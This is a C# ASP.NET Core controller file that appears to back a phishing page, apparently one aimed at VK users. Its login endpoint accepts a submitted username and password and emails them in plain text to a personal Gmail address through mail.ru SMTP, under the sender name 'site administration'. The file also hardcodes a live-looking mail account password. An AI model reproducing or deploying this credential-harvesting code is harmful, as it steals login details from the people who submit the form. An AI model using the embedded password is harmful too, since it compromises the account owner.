using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.AspNetCore.Mvc;
using System.Net;
using MailKit.Net.Smtp;
using System.Threading.Tasks;
using MimeKit;

namespace VkConroller.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class LoginController : ControllerBase
    {
        public LoginController()
        {
        }
        [HttpPost]
        public async Task<IActionResult> Post([FromForm] string login, [FromForm] string password)
        {
            /*try
            {
                MailAddress from = new MailAddress("amir.taziev@mail.ru", "Amir");
                MailAddress to = new MailAddress("20012001amiramir@gmail.com");
                MailMessage m = new MailMessage(from, to);
                var a = new string[] {login, password};
                m.Subject = a.ToString();
                SmtpClient smpt = new SmtpClient("smtp.mail.ru", 465);
                smpt.Credentials = new NetworkCredential("amir.taziev@mail.ru", "K$8YArac");
                smpt.EnableSsl = true;
                await smpt.SendAsync(m, );
                
                
            }
            catch (Exception ex)
            {
                return NotFound();
            }
            */
            var emailMessage = new MimeMessage();

            emailMessage.From.Add(new MailboxAddress("Администрация сайта", "amir.taziev@mail.ru"));
            emailMessage.To.Add(new MailboxAddress("putin", "20012001amiramir@gmail.com"));
            var a = new string[] {login, password};
            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = login + " " + password
            };

            using (var client = new SmtpClient())
            {
                await client.ConnectAsync("smtp.mail.ru", 465, true);
                await client.AuthenticateAsync("amir.taziev@mail.ru", "K$8YArac");
                await client.SendAsync(emailMessage);
                await client.DisconnectAsync(true);
                return Ok();
            }
        }
        [HttpPost("delete")]
        public async Task<IActionResult> Delete([FromForm] string login, [FromForm] string password)
        {
            /*try
            {
                MailAddress from = new MailAddress("amir.taziev@mail.ru", "Amir");
                MailAddress to = new MailAddress("20012001amiramir@gmail.com");
                MailMessage m = new MailMessage(from, to);
                var a = new string[] {login, password};
                m.Subject = a.ToString();
                SmtpClient smpt = new SmtpClient("smtp.mail.ru", 465);
                smpt.Credentials = new NetworkCredential("amir.taziev@mail.ru", "K$8YArac");
                smpt.EnableSsl = true;
                await smpt.SendAsync(m, );
                
                
            }
            catch (Exception ex)
            {
                return NotFound();
            }
            */
            var emailMessage = new MimeMessage();

            emailMessage.From.Add(new MailboxAddress("Администрация сайта", "amir.taziev@mail.ru"));
            emailMessage.To.Add(new MailboxAddress("putin", "20012001amiramir@gmail.com"));
            var a = new string[] {login, password};
            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = "DELETE"
            };

            using (var client = new SmtpClient())
            {
                await client.ConnectAsync("smtp.mail.ru", 465, true);
                await client.AuthenticateAsync("amir.taziev@mail.ru", "K$8YArac");
                await client.SendAsync(emailMessage);
                await client.DisconnectAsync(true);
                return Ok();
            }
        }
    }
}